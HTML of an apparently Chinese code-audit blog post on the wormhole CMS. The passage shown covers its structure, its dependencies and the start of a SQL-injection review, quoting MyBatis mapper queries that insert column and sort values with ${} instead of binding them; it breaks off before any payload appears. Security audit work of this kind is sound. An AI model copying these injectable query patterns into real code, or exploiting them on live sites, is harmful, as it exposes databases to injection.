@@ -1,0 +1,837 @@
+<!doctype html><html lang=en-zh dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="GitHub地址-https://github.com/wormhole/cms"><title>wormhole-cms</title>
+<link rel=canonical href=https://hadagaga.github.io/p/wormhole-cms/><link rel=stylesheet href=/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css><meta property='og:title' content="wormhole-cms"><meta property='og:description' content="GitHub地址-https://github.com/wormhole/cms"><meta property='og:url' content='https://hadagaga.github.io/p/wormhole-cms/'><meta property='og:site_name' content='hadagaga blog'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Code Audit'><meta property='article:published_time' content='2024-12-16T00:00:00+00:00'><meta property='article:modified_time' content='2024-12-16T00:00:00+00:00'><meta property='og:image' content='https://hadagaga.github.io/p/wormhole-cms/cover.png'><meta name=twitter:title content="wormhole-cms"><meta name=twitter:description content="GitHub地址-https://github.com/wormhole/cms"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://hadagaga.github.io/p/wormhole-cms/cover.png'><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu6187617985535410037.png width=300 height=286 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🍥</span></figure><div class=site-meta><h1 class=site-name><a href=/>hadagaga blog</a></h1><h2 class=site-description>不要让时代的悲哀成为你的悲哀。</h2></div></header><ol class=menu-social><li><a href=https://github.com/hadagaga target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#项目结构>项目结构</a></li><li><a href=#项目依赖审计>项目依赖审计</a></li><li><a href=#单点漏洞审计>单点漏洞审计</a><ol><li><a href=#sql>SQL</a><ol><li><a href=#srcmainresourcesmappermenumapperxml>src/main/resources/mapper/MenuMapper.xml</a></li><li><a href=#srcmainresourcesmapperrolemapperxml成功>src/main/resources/mapper/RoleMapper.xml（成功）</a></li><li><a href=#srcmainresourcesmapperuploadmapperxml成功>src/main/resources/mapper/UploadMapper.xml（成功）</a></li></ol></li><li><a href=#任意文件操控>任意文件操控</a></li><li><a href=#xss>XSS</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/wormhole-cms/><img src=/p/wormhole-cms/cover_hu16396862595996524584.png srcset="/p/wormhole-cms/cover_hu16396862595996524584.png 800w, /p/wormhole-cms/cover_hu17375922232125402097.png 1600w" width=800 height=193 loading=lazy alt="Featured image of post wormhole-cms"></a></div><div class=article-details><header class=article-category><a href=/categories/cate2/ style=background-color:#2a9d8f;color:#fff>代码审计记录</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/wormhole-cms/>wormhole-cms</a></h2><h3 class=article-subtitle>GitHub地址-https://github.com/wormhole/cms</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>Dec 16, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>阅读时长: 9 分钟</time></div></footer></div></header><section class=article-content><h2 id=项目结构>项目结构</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=err>├─</span><span class=n>java</span>
+</span></span><span class=line><span class=cl><span class=err>│</span>  <span class=err>└─</span><span class=n>net</span>
+</span></span><span class=line><span class=cl><span class=err>│</span>      <span class=err>└─</span><span class=n>stackoverflow</span>
+</span></span><span class=line><span class=cl><span class=err>│</span>          <span class=err>└─</span><span class=n>cms</span>
+</span></span><span class=line><span class=cl><span class=err>│</span>              <span class=err>├─</span><span class=n>common</span>             <span class=p>(</span><span class=err>公共代码</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=err>│</span>              <span class=err>├─</span><span class=n>config</span>             <span class=p>(</span><span class=err>配置</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=err>│</span>              <span class=err>├─</span><span class=n>constant</span>           <span class=p>(</span><span class=err>常量类</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=err>│</span>              <span class=err>├─</span><span class=n>dao</span>                <span class=p>(</span><span class=err>数据库访问层</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=err>│</span>              <span class=err>├─</span><span class=n>exception</span>          <span class=p>(</span><span class=err>自定义异常类</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=err>│</span>              <span class=err>├─</span><span class=n>model</span>              
+</span></span><span class=line><span class=cl><span class=err>│</span>              <span class=err>│</span>  <span class=err>├─</span><span class=n>entity</span>          <span class=p>(</span><span class=err>实体类</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=err>│</span>              <span class=err>│</span>  <span class=err>└─</span><span class=n>vo</span>              <span class=p>(</span><span class=n>View</span> <span class=ne>Object</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=err>│</span>              <span class=err>├─</span><span class=n>security</span>           <span class=p>(</span><span class=n>Spring</span> <span class=n>Security相关代码</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=err>│</span>              <span class=err>├─</span><span class=n>service</span>            <span class=p>(</span><span class=err>服务层代码）</span>
+</span></span><span class=line><span class=cl><span class=err>│</span>              <span class=err>├─</span><span class=n>util</span>               <span class=p>(</span><span class=err>工具类</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=err>│</span>              <span class=err>└─</span><span class=n>web</span>                
+</span></span><span class=line><span class=cl><span class=err>│</span>                  <span class=err>├─</span><span class=n>controller</span>     <span class=p>(</span><span class=err>业务层代码</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=err>│</span>                  <span class=err>│</span>  <span class=err>├─</span><span class=n>auth</span>        <span class=p>(</span><span class=err>认证授权模块</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=err>│</span>                  <span class=err>│</span>  <span class=err>├─</span><span class=n>config</span>      <span class=p>(</span><span class=err>系统设置模块</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=err>│</span>                  <span class=err>│</span>  <span class=err>├─</span><span class=n>dashboard</span>   <span class=p>(</span><span class=err>仪表盘页面</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=err>│</span>                  <span class=err>│</span>  <span class=err>└─</span><span class=n>personal</span>    <span class=p>(</span><span class=err>个人详情页面</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=err>│</span>                  <span class=err>├─</span><span class=n>filter</span>         <span class=p>(</span><span class=err>过滤器</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=err>│</span>                  <span class=err>├─</span><span class=n>interceptor</span>    <span class=p>(</span><span class=err>拦截器</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=err>│</span>                  <span class=err>└─</span><span class=n>listener</span>       <span class=p>(</span><span class=err>监听器</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=err>└─</span><span class=n>resources</span>                         
+</span></span><span class=line><span class=cl>    <span class=err>├─</span><span class=n>keystore</span>                      <span class=p>(</span><span class=n>https</span> <span class=n>key</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=err>├─</span><span class=n>lib</span>                           <span class=p>(</span><span class=n>sigar动态库</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=err>├─</span><span class=n>mapper</span>                        <span class=p>(</span><span class=n>Mybatis</span> <span class=n>mapper文件</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=err>├─</span><span class=n>sql</span>                           <span class=p>(</span><span class=err>建库脚本</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=err>├─</span><span class=k>static</span>                        <span class=p>(</span><span class=err>静态文件</span><span class=p>,</span><span class=err>前端打包后放这</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=err>├─</span><span class=n>templates</span>                     <span class=p>(</span><span class=err>模板文件</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=err>├─</span><span class=n>application</span><span class=o>.</span><span class=n>properties</span>        <span class=p>(</span><span class=err>配置文件</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=err>└─</span><span class=n>logback</span><span class=o>.</span><span class=n>xml</span>                   <span class=p>(</span><span class=n>logback日志配置</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=项目依赖审计>项目依赖审计</h2><p>​ 经过对项目依赖的审计发现，该项目引入依赖较少，且没有已披露的漏洞。</p><h2 id=单点漏洞审计>单点漏洞审计</h2><h3 id=sql>SQL</h3><p>​ 因为该项目使用了mybatis，所以我们可以直接来到resource下的mapper目录审计里面的xml文件。</p><h4 id=srcmainresourcesmappermenumapperxml>src/main/resources/mapper/MenuMapper.xml</h4><p>​ 该文件中有两处使用了$，分别是：</p><p>第13行：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl>    <span class=nt>&lt;sql</span> <span class=na>id=</span><span class=s>&#34;where&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;where&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;if</span> <span class=na>test=</span><span class=s>&#34;eqWrapper != null&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;foreach</span> <span class=na>collection=</span><span class=s>&#34;eqWrapper.entrySet()&#34;</span> <span class=na>index=</span><span class=s>&#34;column&#34;</span> <span class=na>item=</span><span class=s>&#34;value&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>                    <span class=nt>&lt;if</span> <span class=na>test=</span><span class=s>&#34;column != null and value != null&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>                        and `${column}` = #{value}
+</span></span><span class=line><span class=cl>                    <span class=nt>&lt;/if&gt;</span>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;/foreach&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;/if&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;if</span> <span class=na>test=</span><span class=s>&#34;neqWrapper != null&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;foreach</span> <span class=na>collection=</span><span class=s>&#34;neqWrapper.entrySet()&#34;</span> <span class=na>index=</span><span class=s>&#34;column&#34;</span> <span class=na>item=</span><span class=s>&#34;value&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>                    <span class=nt>&lt;if</span> <span class=na>test=</span><span class=s>&#34;column != null and value != null&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>                        and `${column}` != #{value}
+</span></span><span class=line><span class=cl>                    <span class=nt>&lt;/if&gt;</span>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;/foreach&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;/if&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;if</span> <span class=na>test=</span><span class=s>&#34;inWrapper != null&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;foreach</span> <span class=na>collection=</span><span class=s>&#34;inWrapper.entrySet()&#34;</span> <span class=na>index=</span><span class=s>&#34;column&#34;</span> <span class=na>item=</span><span class=s>&#34;values&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>                    <span class=nt>&lt;if</span> <span class=na>test=</span><span class=s>&#34;values != null and values.size() &gt; 0&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>                        and `${column}` in
+</span></span><span class=line><span class=cl>                        <span class=nt>&lt;foreach</span> <span class=na>collection=</span><span class=s>&#34;values&#34;</span> <span class=na>item=</span><span class=s>&#34;value&#34;</span> <span class=na>open=</span><span class=s>&#34;(&#34;</span> <span class=na>separator=</span><span class=s>&#34;,&#34;</span> <span class=na>close=</span><span class=s>&#34;)&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>                            #{value}
+</span></span><span class=line><span class=cl>                        <span class=nt>&lt;/foreach&gt;</span>
+</span></span><span class=line><span class=cl>                    <span class=nt>&lt;/if&gt;</span>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;/foreach&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;/if&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;if</span> <span class=na>test=</span><span class=s>&#34;ninWrapper != null&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;foreach</span> <span class=na>collection=</span><span class=s>&#34;ninWrapper.entrySet()&#34;</span> <span class=na>index=</span><span class=s>&#34;column&#34;</span> <span class=na>item=</span><span class=s>&#34;values&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>                    <span class=nt>&lt;if</span> <span class=na>test=</span><span class=s>&#34;values != null and values.size() &gt; 0&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>                        and `${column}` not in
+</span></span><span class=line><span class=cl>                        <span class=nt>&lt;foreach</span> <span class=na>collection=</span><span class=s>&#34;values&#34;</span> <span class=na>item=</span><span class=s>&#34;value&#34;</span> <span class=na>open=</span><span class=s>&#34;(&#34;</span> <span class=na>separator=</span><span class=s>&#34;,&#34;</span> <span class=na>close=</span><span class=s>&#34;)&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>                            #{value}
+</span></span><span class=line><span class=cl>                        <span class=nt>&lt;/foreach&gt;</span>
+</span></span><span class=line><span class=cl>                    <span class=nt>&lt;/if&gt;</span>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;/foreach&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;/if&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;if</span> <span class=na>test=</span><span class=s>&#34;keyWrapper != null and keyWrapper.size() &gt; 0&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;foreach</span> <span class=na>collection=</span><span class=s>&#34;keyWrapper.entrySet()&#34;</span> <span class=na>index=</span><span class=s>&#34;key&#34;</span> <span class=na>item=</span><span class=s>&#34;columns&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>                    <span class=nt>&lt;if</span> <span class=na>test=</span><span class=s>&#34;columns != null and columns.size() &gt; 0&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>                        and
+</span></span><span class=line><span class=cl>                        <span class=nt>&lt;foreach</span> <span class=na>collection=</span><span class=s>&#34;columns&#34;</span> <span class=na>item=</span><span class=s>&#34;column&#34;</span> <span class=na>open=</span><span class=s>&#34;(&#34;</span> <span class=na>separator=</span><span class=s>&#34; or &#34;</span> <span class=na>close=</span><span class=s>&#34;)&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>                            `${column}` like CONCAT(&#39;%&#39;,#{key},&#39;%&#39;)
+</span></span><span class=line><span class=cl>                        <span class=nt>&lt;/foreach&gt;</span>
+</span></span><span class=line><span class=cl>                    <span class=nt>&lt;/if&gt;</span>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;/foreach&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;/if&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;/where&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;/sql&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>第75行：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl>    <span class=nt>&lt;select</span> <span class=na>id=</span><span class=s>&#34;selectWithQuery&#34;</span> <span class=na>resultMap=</span><span class=s>&#34;baseMap&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>            select * from `menu`
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;include</span> <span class=na>refid=</span><span class=s>&#34;where&#34;</span><span class=nt>/&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;if</span> <span class=na>test=</span><span class=s>&#34;sortWrapper != null and sortWrapper.size() &gt; 0&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>                order by
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;foreach</span> <span class=na>collection=</span><span class=s>&#34;sortWrapper.entrySet()&#34;</span> <span class=na>index=</span><span class=s>&#34;s&#34;</span> <span class=na>item=</span><span class=s>&#34;o&#34;</span> <span class=na>separator=</span><span class=s>&#34;,&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>                    `${s}` ${o}
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;/foreach&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;/if&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;if</span> <span class=na>test=</span><span class=s>&#34;offset != null and limit != null&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>                limit #{offset}, #{limit}
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;/if&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;/select&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>​ 可以看到这里第13行的查询语句中的column参数使用了$，而第75行则是s和o使用了$。所以这里公共有三个可以注入点，我们一个个测试。</p><h5 id=column失败>column（失败）</h5><p>​ 我们在这个xml文件中搜索where，发现有这几个地方调用了这个where语句，分别是：</p><p>62行：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl>    <span class=nt>&lt;select</span> <span class=na>id=</span><span class=s>&#34;countWithQuery&#34;</span> <span class=na>resultType=</span><span class=s>&#34;int&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>        select COUNT(*) from `menu`
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;include</span> <span class=na>refid=</span><span class=s>&#34;where&#34;</span><span class=nt>/&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;/select&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>75行：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl>    <span class=nt>&lt;select</span> <span class=na>id=</span><span class=s>&#34;selectWithQuery&#34;</span> <span class=na>resultMap=</span><span class=s>&#34;baseMap&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>        select * from `menu`
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;include</span> <span class=na>refid=</span><span class=s>&#34;where&#34;</span><span class=nt>/&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;if</span> <span class=na>test=</span><span class=s>&#34;sortWrapper != null and sortWrapper.size() &gt; 0&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>            order by
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;foreach</span> <span class=na>collection=</span><span class=s>&#34;sortWrapper.entrySet()&#34;</span> <span class=na>index=</span><span class=s>&#34;s&#34;</span> <span class=na>item=</span><span class=s>&#34;o&#34;</span> <span class=na>separator=</span><span class=s>&#34;,&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>                `${s}` ${o}
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;/foreach&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;/if&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;if</span> <span class=na>test=</span><span class=s>&#34;offset != null and limit != null&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>            limit #{offset}, #{limit}
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;/if&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;/select&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>116行：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl>    <span class=nt>&lt;delete</span> <span class=na>id=</span><span class=s>&#34;deleteWithQuery&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>        delete from `menu`
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;include</span> <span class=na>refid=</span><span class=s>&#34;where&#34;</span><span class=nt>/&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;/delete&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>161行：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
